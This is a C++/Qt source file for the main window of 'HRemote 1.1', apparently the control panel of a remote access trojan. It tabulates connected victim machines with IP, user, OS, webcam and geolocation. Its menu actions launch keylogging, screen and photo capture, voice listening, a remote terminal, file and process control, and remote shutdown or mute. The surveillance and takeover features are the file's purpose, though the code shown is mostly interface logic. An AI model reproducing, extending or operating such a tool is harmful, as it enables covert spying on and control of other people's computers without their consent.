#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QMessageBox>
#include <QDateTime>
#include <QStringList>
#include <QScrollBar>
#include <QClipboard>
#include <QFile>
#include <QTextStream>
#include <QHostAddress>
#include <QNetworkInterface>
#include <QPushButton>
#include <QHeaderView>
#include <QCloseEvent>
#include <QInputDialog>
#include "nofocusdelegate.cpp"
#include "tool.h"

#include "getiparea.cpp"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    tool::m=this;
    tool::openDatabase();

    infomut=new QMutex();
    setWindowIcon(QIcon(":/image/image/Icon.ico"));
    this->setWindowTitle("HRemote 1.1");
    init();

}

MainWindow::~MainWindow(){

}

void MainWindow::closeEvent(QCloseEvent *event){
    winlis->close();//监听的窗口
    tool::acc->exit();
    tool::islisten = false;
    tool::isQuit=true;
    WSACleanup();
    event->accept();
}

void MainWindow::init(){//界面设置和槽关联 info 和 log 和 statebar 和 toolbar


    mid=0;//每个连接的id

    gridlayout1=new QGridLayout();

    tabinfo=new QTabWidget();
    info=new QTableWidget();
    log=new QTableWidget();
    winlis =new mylistenWindows();

    ///以下是info表的初始化

    info->setColumnCount(16);
    QStringList header;
    header<<"Socket"<<"IP"<<"计算机名"<<"当前用户名"<<"操作系统"<<"CPU"<<"CPU使用率"<<"内存"<<"内存使用率"<<"上传速度"<<"下载速度"<<"摄像头"<<"连接时间"<<"地理位置"<<"离开情况"<<"标记";
    info->setHorizontalHeaderLabels(header);//设置表头

    info->setColumnWidth(0,60);
    info->setColumnWidth(1,90);
    info->setColumnWidth(2,90);
    info->setColumnWidth(3,90);
    info->setColumnWidth(4,90);
    info->setColumnWidth(5,60);
    info->setColumnWidth(6,90);
    info->setColumnWidth(7,60);
    info->setColumnWidth(8,90);
    info->setColumnWidth(9,60);
    info->setColumnWidth(10,60);
    info->setColumnWidth(11,60);
    info->setColumnWidth(12,90);
    info->setColumnWidth(13,90);
    info->setColumnWidth(14,60);
    info->setColumnWidth(15,60);
    //调整表格的列宽
    // info->horizontalHeader()->setSectionResizeMode(9,QHeaderView::Stretch);//列表自动伸展
    info->setSortingEnabled(true);//可排序
    info->verticalHeader()->setVisible(false);//垂直表头不可见
    info->setShowGrid(false); //设置不显示格子线
    info->setFrameShape(QFrame::NoFrame); //设置无边框
    info->verticalHeader()->setDefaultSectionSize(20); //设置行高
    info->setSelectionBehavior(QAbstractItemView::SelectRows);  //每次选择一行
    info->setEditTriggers(QAbstractItemView::NoEditTriggers); //设置不可编辑
    info->setStyleSheet("selection-background-color:lightblue;"); //设置选中背景色
    info->setSelectionMode(QAbstractItemView::SingleSelection);//单选
//    info->setFocusPolicy(Qt::NoFocus);//取消选中时的虚线
    info->setItemDelegate(new NoFocusDelegate());//用于取消选中时产生的虚线
    info->horizontalHeader()->setHighlightSections(false);//取消表头塌陷
    QFont font = info->horizontalHeader()->font();
    font.setBold(true);
    info->horizontalHeader()->setFont(font);//表头字体加粗
    info->horizontalScrollBar()->setStyleSheet("QScrollBar{background:transparent; height:10px;}"
                                               "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                               "QScrollBar::handle:hover{background:gray;}"
                                               "QScrollBar::sub-line{background:transparent;}"
                                               "QScrollBar::add-line{background:transparent;}");

    info->verticalScrollBar()->setStyleSheet("QScrollBar{background:transparent; width: 10px;}"
                                             "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                             "QScrollBar::handle:hover{background:gray;}"
                                             "QScrollBar::sub-line{background:transparent;}"
                                             "QScrollBar::add-line{background:transparent;}");

    info->setHorizontalScrollMode(QAbstractItemView::ScrollPerPixel);//滚动条按像素移动
    info->setVerticalScrollMode(QAbstractItemView::ScrollPerPixel);

    info->setContextMenuPolicy(Qt::CustomContextMenu);//自定义右键菜单

    ///以下是log表的初始化，日志


    log->setColumnCount(2);
    QStringList header2;
    header2<<"时间"<<"事件";
    log->setColumnWidth(0,200);//第一列宽度
    log->setHorizontalHeaderLabels(header2);//设置表头
    log->horizontalHeader()->setSectionResizeMode(1,QHeaderView::Stretch);//列表第2列自动伸展

    log->setSortingEnabled(false);
    log->verticalHeader()->setVisible(false);//垂直表头不可见
    log->setShowGrid(false); //设置不显示格子线
    log->setFrameShape(QFrame::NoFrame); //设置无边框
    log->verticalHeader()->setDefaultSectionSize(20); //设置行高
    log->setSelectionBehavior(QAbstractItemView::SelectRows);  //每次选择一行
    log->setEditTriggers(QAbstractItemView::NoEditTriggers); //设置不可编辑
    log->setStyleSheet("selection-background-color:lightblue;"); //设置选中背景色
    log->setSelectionMode(QAbstractItemView::SingleSelection);//单选
   // log->setFocusPolicy(Qt::NoFocus);//取消选中时的虚线
    log->setItemDelegate(new NoFocusDelegate());//用于取消选中时产生的虚线

    log->horizontalHeader()->setHighlightSections(false);//取消表头塌陷
    log->horizontalScrollBar()->setStyleSheet("QScrollBar{background:transparent; height:10px;}"
                                              "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                              "QScrollBar::handle:hover{background:gray;}"
                                              "QScrollBar::sub-line{background:transparent;}"
                                              "QScrollBar::add-line{background:transparent;}");

    log->verticalScrollBar()->setStyleSheet("QScrollBar{background:transparent; width: 10px;}"
                                            "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                            "QScrollBar::handle:hover{background:gray;}"
                                            "QScrollBar::sub-line{background:transparent;}"
                                            "QScrollBar::add-line{background:transparent;}");


    log->setHorizontalScrollMode(QAbstractItemView::ScrollPerPixel);//滚动条按像素移动
    log->setVerticalScrollMode(QAbstractItemView::ScrollPerPixel);

    log->setContextMenuPolicy(Qt::CustomContextMenu);//自定义右键菜单

    addLog("HRemote，欢迎使用 by：小豪",5);

    ///以下是界面布局


    tabinfo->addTab(info,"信息");
    tabinfo->setTabPosition(QTabWidget::South);
    tabinfo->setTabShape(QTabWidget::Triangular);

    gridlayout1->addWidget(tabinfo,0,0,1,1);
    gridlayout1->addWidget(log,1,0,1,1);

    gridlayout1->setRowStretch(0,2);//第一行占2/3
    gridlayout1->setRowStretch(1,1);//第二行占1/3

    QWidget* centerWidget = new QWidget(this);
    centerWidget->setLayout(gridlayout1);
    this->setCentralWidget(centerWidget);

    ///状态栏

    myIP = new QLabel("127.0.0.1",this);
    myListenState = new QLabel("未监听",this);
    numOfPC = new QLabel("Online: 0",this);
    //状态栏标签

    ui->statusBar->addWidget(myIP,2);
    ui->statusBar->addWidget(myListenState,3);
    ui->statusBar->addWidget(numOfPC,0);//添加状态栏信息

    ///动作
    /// 需要新建窗口
    a_process = new QAction("进程管理",this);
    a_file=new QAction("文件管理",this);
    a_keylog=new QAction("键盘记录",this);      //ok
    a_screen=new QAction("拍照截图",this);
    a_terminal=new QAction("远程终端",this);
    a_voice=new QAction("语音监听",this);
    a_listen=new QAction("监听端口",this);

    ///不需要新建窗口
    a_refresh = new QAction("刷新",this);
    a_disconnect=new QAction("断开连接",this);
    a_shutdown=new QAction("关机",this);
    a_mute=new QAction("静音",this);
    a_exit=new QAction("退出程序",this);
    a_clear=new QAction("清理内存",this); //事件

    log_clear=new QAction("清空所有",this);
    log_delete=new QAction("删除此项",this);
    log_copy=new QAction("复制信息",this);
    log_export=new QAction("导出文件",this);

    a_nickname=new QAction("设置备注",this);

    a_process->setIcon(QIcon(":/image/image/process.png"));
    a_keylog->setIcon(QIcon(":/image/image/keylog.png"));
    a_refresh->setIcon(QIcon(":/image/image/refresh.png"));
    a_file->setIcon(QIcon(":/image/image/file.png"));
    a_screen->setIcon(QIcon(":/image/image/screen.png"));
    a_terminal->setIcon(QIcon(":/image/image/terminal.png"));
    a_voice->setIcon(QIcon(":/image/image/voice.png"));
    a_disconnect->setIcon(QIcon(":/image/image/disconnect.png"));
    a_clear->setIcon(QIcon(":/image/image/clear.png"));//设置图标
    a_shutdown->setIcon(QIcon(":/image/image/shutdown.png"));
    a_mute->setIcon(QIcon(":/image/image/mute.png"));
    a_exit->setIcon(QIcon(":/image/image/exit.png"));
    a_listen->setIcon(QIcon(":/image/image/listening.png"));
    a_nickname->setIcon(QIcon(":/image/image/nickname.png"));


    ///工具栏

    ui->mainToolBar->addAction(a_process);
    ui->mainToolBar->addAction(a_file);
    ui->mainToolBar->addAction(a_keylog);
    ui->mainToolBar->addAction(a_screen);
    ui->mainToolBar->addAction(a_terminal);
    ui->mainToolBar->addAction(a_voice);
    ui->mainToolBar->addAction(a_disconnect);
    ui->mainToolBar->addAction(a_listen);
    ui->mainToolBar->addAction(a_clear);//在工具栏中添加动作按钮

    ui->mainToolBar->setIconSize(QSize(36,36));//工具栏设置图标大小

    ///右键菜单

    info_menu=new QMenu(this);   //info右键菜单

    QMenu* session=new QMenu(this);
    session->setTitle("会话管理");
    session->setIcon(QIcon(":/image/image/session.png"));
    session->addAction(a_nickname);
    session->addAction(a_shutdown);
    session->addAction(a_mute);
    session->addAction(a_disconnect);
    session->addAction(a_exit);


    info_menu->addAction(a_refresh);
    info_menu->addAction(a_process);
    info_menu->addAction(a_file);
    info_menu->addAction(a_keylog);
    info_menu->addAction(a_screen);
    info_menu->addAction(a_terminal);
    info_menu->addAction(a_voice);

    info_menu->addMenu(session);
    //info右键菜单添加动作

    log_menu=new QMenu(this);
    log_menu->addAction(log_delete);
    log_menu->addAction(log_clear);
    log_menu->addAction(log_copy);
    log_menu->addAction(log_export);//LOG右键菜单




    ///14个动作与槽相连接
    connect(a_process, SIGNAL(triggered(bool)), this, SLOT(process_triggered()));
    connect(a_keylog, SIGNAL(triggered(bool)), this, SLOT(keylog_triggered()));
    connect(a_refresh, SIGNAL(triggered(bool)), this, SLOT(refresh_triggered()));
    connect(a_file, SIGNAL(triggered(bool)), this, SLOT(file_triggered()));
    connect(a_screen, SIGNAL(triggered(bool)), this, SLOT(screen_triggered()));
    connect(a_terminal, SIGNAL(triggered(bool)), this, SLOT(terminal_triggered()));
    connect(a_voice, SIGNAL(triggered(bool)), this, SLOT(voice_triggered()));
    connect(a_disconnect, SIGNAL(triggered(bool)), this, SLOT(disconnect_triggered()));
    connect(a_clear, SIGNAL(triggered(bool)), this, SLOT(clearNM_triggered()));

    connect(a_nickname, SIGNAL(triggered(bool)), this, SLOT(nickname_triggered()));
    connect(a_shutdown, SIGNAL(triggered(bool)), this, SLOT(shutdown_triggered()));
    connect(a_mute, SIGNAL(triggered(bool)), this, SLOT(mute_triggered()));
    connect(a_exit, SIGNAL(triggered(bool)), this, SLOT(exit_triggered()));

    connect(a_listen, SIGNAL(triggered(bool)), this, SLOT(listen_triggered()));

    connect(log_delete, SIGNAL(triggered(bool)), this, SLOT(delete_triggered()));
    connect(log_clear, SIGNAL(triggered(bool)), this, SLOT(clear_triggered()));
    connect(log_copy, SIGNAL(triggered(bool)), this, SLOT(copy_triggered()));
    connect(log_export, SIGNAL(triggered(bool)), this, SLOT(export_triggered()));


    //右键菜单的槽`
    connect(info, SIGNAL(customContextMenuRequested(const QPoint&)), this, SLOT(ShowInfoMenu(const QPoint&)));
    connect(log, SIGNAL(customContextMenuRequested(const QPoint&)), this, SLOT(ShowLogMenu(const QPoint&)));


    //各个线程同步的槽
//    connect(tool::acc, SIGNAL(signalAddLog(QString,int)), this, SLOT(addLog2(QString,int)));
    connect(tool::acc, SIGNAL(signalAddInfo(SOCKET)), this, SLOT(addInfo(SOCKET)));
    connect(tool::acc, SIGNAL(signalAddLog(QString,int)), this, SLOT(addLog(QString,int)));

    connect(winlis, SIGNAL(signalAddLog(QString,int)), this, SLOT(addLog(QString,int)));
    connect(winlis, SIGNAL(signalChangeState(QString)), this, SLOT(setListenState(QString)));

//    connect(tool::acc,SIGNAL(signalTest(QString)),this,SLOT(testSlots(QString)));

    qRegisterMetaType<SOCKET>("SOCKET");
    qRegisterMetaType<QTextCursor>("QTextCursor");
    qRegisterMetaType<QVector<int>>("QVector<int>");
    qRegisterMetaType<mfile>("mfile");

}

void MainWindow::addLog(QString event,int level){
    QColor color_level[]={QColor(101,147,74),QColor(254,67,101),QColor(137,157,192),QColor(205,201,125),QColor(87,96,105)};
    //0上线，1下线，2开始事件,3结束事件,4其他事件

    QDateTime time = QDateTime::currentDateTime();//获取系统现在的时间
    QString strTime = time.toString("yyyy-MM-dd hh:mm:ss"); //设置显示格式

    int num= log->rowCount();

    log->insertRow(num);

    log->setItem(num,0,new QTableWidgetItem(strTime));
    log->setItem(num,1,new QTableWidgetItem(event));
    for(int i=0;i<2;i++){
        log->item(num, i)->setTextAlignment(Qt::AlignHCenter);//居中
        log->item(num, i)->setForeground(color_level[level%5]);//颜色
    }
    log->viewport()->update();
    log->scrollToBottom();
    log->viewport()->update();

}

void MainWindow::addInfo(SOCKET sClient){
    QString ID = QString::fromStdString(to_string (sClient));
    QString IP = tool::GetIPBySocket(sClient);
    QDateTime time = QDateTime::currentDateTime();//获取系统现在的时间
    QString connectTime = time.toString("yyyy-MM-dd hh:mm:ss"); //设置显示格式
    QString localPlace ="";
    //IP数据库
    try{
        IpLocater locater("qqwry.dat");
        string area = locater.getIpAddr(IP.toStdString());
        localPlace =QString::fromStdString(area);
    }catch(...){
        localPlace="";
    }

    infomut->lock();
    int num = info->rowCount();
    for(int i=0;i<num;i++){
        if(info->item(i,0)->text().compare(ID)==0){
            infomut->unlock();
            return;
        }
    }


    info->insertRow(num);
    info->setItem(num,0,new QTableWidgetItem(ID));
    info->setItem(num,1,new QTableWidgetItem(IP));
    info->setItem(num,2,new QTableWidgetItem(""));
    info->setItem(num,3,new QTableWidgetItem(""));
    info->setItem(num,4,new QTableWidgetItem(""));
    info->setItem(num,5,new QTableWidgetItem(""));
    info->setItem(num,6,new QTableWidgetItem(""));
    info->setItem(num,7,new QTableWidgetItem(""));
    info->setItem(num,8,new QTableWidgetItem(""));
    info->setItem(num,9,new QTableWidgetItem(""));
    info->setItem(num,10,new QTableWidgetItem(""));
    info->setItem(num,11,new QTableWidgetItem(""));
    info->setItem(num,12,new QTableWidgetItem(connectTime));
    info->setItem(num,13,new QTableWidgetItem(localPlace));
    info->setItem(num,14,new QTableWidgetItem(""));
    info->setItem(num,15,new QTableWidgetItem(""));

    for(int i=0;i<16;i++){
        info->item(num, i)->setTextAlignment(Qt::AlignHCenter);//居中
        info->item(num, i)->setForeground(QColor(0x01,0x65,0xfa));//颜色
    }
    info->viewport()->update();
    infomut->unlock();

    QString a ="Online: ";
    a+=QString::number(num+1);
    numOfPC->setText(a);



    return ;
}

void MainWindow::setInfo(SOCKET sClient,int col,QString m){

    if(col==15){//标识符
        if(m.length()<=0)return;
        m = tool::getNickname(m);
    }
    QString ID = QString::fromStdString(to_string (sClient));
    infomut->lock();
    int num = info->rowCount();
    for(int i=0;i<num;i++){
        if(info->item(i,0)->text().compare(ID)==0){
            info->setItem(i,col,new QTableWidgetItem(m));
            info->item(i,col)->setTextAlignment(Qt::AlignHCenter);//居中
            info->item(i,col)->setForeground(QColor(0x01,0x65,0xfa));//颜色
            break;
        }
    }
    info->viewport()->update();
    infomut->unlock();
}

void MainWindow::delInfo(SOCKET sClient){
    QString ID = QString::fromStdString(to_string (sClient));
    infomut->lock();
    int num = info->rowCount();
    for(int i=0;i<num;i++){
        if(info->item(i,0)->text().compare(ID)==0){
            info->removeRow(i);
            QString a ="Online: ";
            a+=QString::number(num-1);
            numOfPC->setText(a);
            break;
        }
    }
    info->viewport()->update();
    infomut->unlock();


}

void MainWindow::ShowInfoMenu(const QPoint& pos)//显示右键菜单
{
    QPoint globalPos = info->mapToGlobal(pos);
    info_menu->exec(globalPos);

}

void MainWindow::ShowLogMenu(const QPoint& pos)//显示右键菜单
{
    QPoint globalPos = log->mapToGlobal(pos);
    log_menu->exec(globalPos);

}

void MainWindow::refresh_triggered()//刷新
{
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           OrderStruct tmpOrder;
           tmpOrder.orderMem=nullptr;
           tmpOrder.orderSize=0;
           for(int i=1;i<13;i++){
               tmpOrder.orderType=i;
               nm->orderQueue.push(tmpOrder);
           }
           nm->addOrder();

           break;
       }
    }

    tool::mut->unlock();

}

void MainWindow::keylog_triggered()//键盘记录
{

    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           if(nm->keylogwindows==nullptr){
               nm->keylogwindows=new mykeylogWindows(nullptr,nm);

           }
           nm->keylogwindows->show();
           break;
       }
    }
    tool::mut->unlock();
//    std::cout<<thisID.toStdString()<<"send key log"<<std::endl;
}

void MainWindow::process_triggered()//进程管理
{
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           if(nm->processwindows==nullptr){
               nm->processwindows=new myprocessWindows(nullptr,nm);
           }
           nm->processwindows->show();
           break;
       }
    }
    tool::mut->unlock();

}

void MainWindow::file_triggered()//文件管理
{
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           if(nm->filewindows==nullptr){
               nm->filewindows=new myfileWindows(nullptr,nm);
           }
           nm->filewindows->show();
           break;
       }
    }
    tool::mut->unlock();
}

void MainWindow::screen_triggered()//屏幕查看
{
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           if(nm->screenwinodws==nullptr){
               nm->screenwinodws=new myscreenWindows(nullptr,nm);
           }
           nm->screenwinodws->show();
           break;
       }
    }
    tool::mut->unlock();

}

void MainWindow::terminal_triggered()//远程终端
{
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           if(nm->terminalwindows==nullptr){
               nm->terminalwindows=new myterminalWindows(nullptr,nm);
           }
           nm->terminalwindows->show();
           break;
       }
    }
    tool::mut->unlock();
}

void MainWindow::voice_triggered()//语音监控
{
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           if(nm->voicewindows==nullptr){
               nm->voicewindows=new myvoiceWindows(nullptr,nm);
           }
           nm->voicewindows->show();
           break;
       }
    }
    tool::mut->unlock();
}


QString MainWindow::getSelectInfoCol(int col){
    infomut->lock();
    QTableWidgetItem* tmp = info->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        infomut->unlock();
        return "";
    }
    QString thisCol = info->item(row,col)->text();
    infomut->unlock();
    return thisCol;
}

void MainWindow::disconnect_triggered()//会话管理
{
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    int flag=false;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           flag=true;
           tool::mut->unlock();
           nm->finishNet();
           break;
       }
    }
    if(!flag){
        tool::mut->unlock();
    }
//    std::cout<<thisID.toStdString()<<"finish net"<<std::endl;
}

void MainWindow::clearNM_triggered()//清理
{
    int deleteNmSum=tool::deleteQueue->size();
    int clearNum=0;
//    int flag;
    netManager* nm;
    for(int i=0;i<deleteNmSum;i++){
        if (tool::deleteQueue->try_pop(nm)){
//            flag=0;
//            if(nm->filewindows!=nullptr && nm->filewindows->isVisible())flag++;
//            if(nm->voicewindows!=nullptr && nm->voicewindows->isVisible())flag++;
//            if(nm->keylogwindows!=nullptr && nm->keylogwindows->isVisible())flag++;
//            if(nm->screenwinodws!=nullptr && nm->screenwinodws->isVisible())flag++;
//            if(nm->processwindows!=nullptr && nm->processwindows->isVisible())flag++;
//            if(nm->terminalwindows!=nullptr && nm->terminalwindows->isVisible())flag++;
//            if(flag==0){

//                delete[] nm;
                nm->~netManager();
                clearNum++;
//            }else{
//                tool::deleteQueue->push(nm);
//            }
        }
    }
    QMessageBox::about(nullptr, "清理", "共待清理"+QString::number(deleteNmSum)+"个，已清理了"+QString::number(clearNum)+"个");
}


void MainWindow::delete_triggered(){//删除
    int current=log->currentRow();
    if(current==-1)return;
    log->removeRow(current);
}

void MainWindow::clear_triggered(){//清空
    log->setRowCount(0);
}

void MainWindow::copy_triggered(){//复制剪切板
    int current=log->currentRow();
    if(current==-1)return;
    QString time=log->item(current,0)->text();
    QString content=log->item(current,1)->text();
    QClipboard *clipboard = QApplication::clipboard();   //获取系统剪贴板指针
    clipboard->setText(time+"\t"+content);                  //设置剪贴板内容
}

void MainWindow::export_triggered(){//导出文件
    QFile f("HRmote_Log.txt");
    if(!f.open(QIODevice::WriteOnly | QIODevice::Truncate)) 
    {
        addLog("文件打开失败！",5);
        return ;
    }
    QTextStream out(&f);
    int sumRow=log->rowCount();
    for(int i=0;i<sumRow;i++){
        out<<log->item(i,0)->text()<<"\t"<<log->item(i,1)->text()<<"\r\n";
    }
    f.close();
    addLog("日志导出成功",5);

}

void MainWindow::listen_triggered(){//开始监听
    winlis->show();//qt中窗口关闭并不会销毁窗口，只是隐藏了
}

void MainWindow::nickname_triggered(){
    netManager * nm=nullptr;
    bool ok;


    QString oldnickname = getSelectInfoCol(15);

    QString nickname = QInputDialog::getText(this, "备注",
                                         "备注名", QLineEdit::Normal,
                                         oldnickname, &ok);
    QString thisID = getSelectInfoCol(0);

    tool::mut->lock();
    QString ID;
    for (int i=0; i!=tool::storeList->size(); ++i )
    {
        nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
        if ( ID.compare(thisID)==0){
           break;
        }else{
            nm=nullptr;
        }
    }
    tool::mut->unlock();

    if(nm==nullptr)return;


    tool::insertNickname(nm->name,nickname);
    setInfo(nm->sClient,15,nm->name);


}

void MainWindow::shutdown_triggered(){//关机
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           OrderStruct tmpOrder;
           tmpOrder.orderMem=nullptr;
           tmpOrder.orderSize=0;
           tmpOrder.orderType=91;//关机
           nm->orderQueue.push(tmpOrder);

           nm->addOrder();
       }
    }
    tool::mut->unlock();
}

void MainWindow::mute_triggered(){//静音
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           OrderStruct tmpOrder;
           tmpOrder.orderMem=nullptr;
           tmpOrder.orderSize=0;
           tmpOrder.orderType=92;//静音
           nm->orderQueue.push(tmpOrder);

           nm->addOrder();
       }
    }
    tool::mut->unlock();
}

void MainWindow::exit_triggered(){//退出程序
    QString thisID =getSelectInfoCol(0);
    tool::mut->lock();
    QString ID;
    for ( int i=0; i!=tool::storeList->size(); ++i )
    {
        netManager * nm=tool::storeList->at(i);
        ID = QString::fromStdString(to_string (nm->sClient));
       if ( ID.compare(thisID)==0){
           OrderStruct tmpOrder;
           tmpOrder.orderMem=nullptr;
           tmpOrder.orderSize=0;
           tmpOrder.orderType=93;//退出程序
           nm->orderQueue.push(tmpOrder);

           nm->addOrder();
       }
    }
    tool::mut->unlock();
}


//设置监听状态
void MainWindow::setListenState(QString str){
    myListenState->setText(str);
}


